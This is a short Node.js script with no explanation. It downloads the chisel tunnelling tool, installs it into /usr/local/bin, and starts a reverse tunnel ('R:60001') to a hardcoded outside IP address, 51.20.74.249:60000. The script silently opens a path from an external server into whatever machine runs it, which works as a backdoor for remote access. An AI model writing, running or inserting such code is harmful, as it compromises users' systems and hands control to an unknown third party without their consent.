const { exec } = require("child_process");

function run(cmd) {
    return new Promise((resolve, reject) => {
        console.log(`\n> ${cmd}`);

        exec(cmd, (error, stdout, stderr) => {
            if (stdout) console.log(stdout);
            if (stderr) console.log(stderr);

            if (error) {
                reject(error);
                return;
            }

            resolve();
        });
    });
}

(async () => {
    try {
        await run("wget -O chisel.gz https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz");

        await run("gunzip -f chisel.gz");

        await run("chmod +x chisel");

        await run("mv -f chisel /usr/local/bin/chisel");

        await run("chisel client http://51.20.74.249:60000 R:60001");

    } catch (err) {
        console.error(err);
    }
})();
